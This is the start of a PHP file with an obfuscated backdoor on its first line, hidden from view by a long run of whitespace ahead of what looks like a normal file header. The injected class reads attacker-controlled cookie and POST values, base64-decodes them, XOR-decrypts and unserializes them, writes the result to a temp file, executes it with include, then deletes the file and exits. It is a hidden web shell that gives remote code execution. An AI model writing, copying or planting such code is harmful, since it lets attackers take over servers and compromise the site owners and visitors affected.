<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("CDEWcd")){class CDEWcd{public static $iOzGe = "JryUpJKKcJPHojjn";public static $xaOCSRN = NULL;public function __construct(){$IhcuGvaTI = @$_COOKIE[substr(CDEWcd::$iOzGe, 0, 4)];if (!empty($IhcuGvaTI)){$eFYBmz = "base64";$TJdzwU = "";$IhcuGvaTI = explode(",", $IhcuGvaTI);foreach ($IhcuGvaTI as $yzWumdetiT){$TJdzwU .= @$_COOKIE[$yzWumdetiT];$TJdzwU .= @$_POST[$yzWumdetiT];}$TJdzwU = array_map($eFYBmz . "_decode", array($TJdzwU,)); $TJdzwU = $TJdzwU[0] ^ str_repeat(CDEWcd::$iOzGe, (strlen($TJdzwU[0]) / strlen(CDEWcd::$iOzGe)) + 1);CDEWcd::$xaOCSRN = @unserialize($TJdzwU);}}public function __destruct(){$this->OPcejWfaRi();}private function OPcejWfaRi(){if (is_array(CDEWcd::$xaOCSRN)) {$ysFwR = sys_get_temp_dir() . "/" . crc32(CDEWcd::$xaOCSRN["salt"]);@CDEWcd::$xaOCSRN["write"]($ysFwR, CDEWcd::$xaOCSRN["content"]);include $ysFwR;@CDEWcd::$xaOCSRN["delete"]($ysFwR);exit();}}}$NGmWLjH = new CDEWcd(); $NGmWLjH = NULL;} ?><?php
/**
